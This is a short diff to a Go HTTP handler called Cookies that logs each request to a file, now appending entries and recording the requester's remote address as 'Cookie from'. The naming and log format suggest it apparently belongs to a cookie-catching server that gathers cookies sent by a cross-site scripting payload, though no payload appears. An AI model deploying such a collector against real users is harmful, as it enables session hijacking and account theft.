@@ -23,14 +23,15 @@ func init() {
 func Cookies(w http.ResponseWriter, req *http.Request) {
 
 	// open logfile, create if not exist
-	logFile, err := os.OpenFile(cookielog, os.O_RDWR|os.O_CREATE, 0755)
+	logFile, err := os.OpenFile(cookielog, os.O_APPEND|os.O_RDWR|os.O_CREATE, 0644)
 	if err != nil {
-		log.Println("[-] Error creating log file")
+		log.Println("[-] Error creating cookielog file")
 	}
 	defer logFile.Close()
 
 	// print seperator to file
 	fmt.Fprintf(logFile, "=== START ===\n\n")
+	fmt.Fprintf(logFile, "Cookie from: %s\n", req.RemoteAddr)
 
 	switch req.Method {
 
@@ -57,5 +58,5 @@ func Cookies(w http.ResponseWriter, req *http.Request) {
 
 	}
 
-	fmt.Fprintf(logFile, "=== END ===\n")
+	fmt.Fprintf(logFile, "=== END ===\n\n")
 }
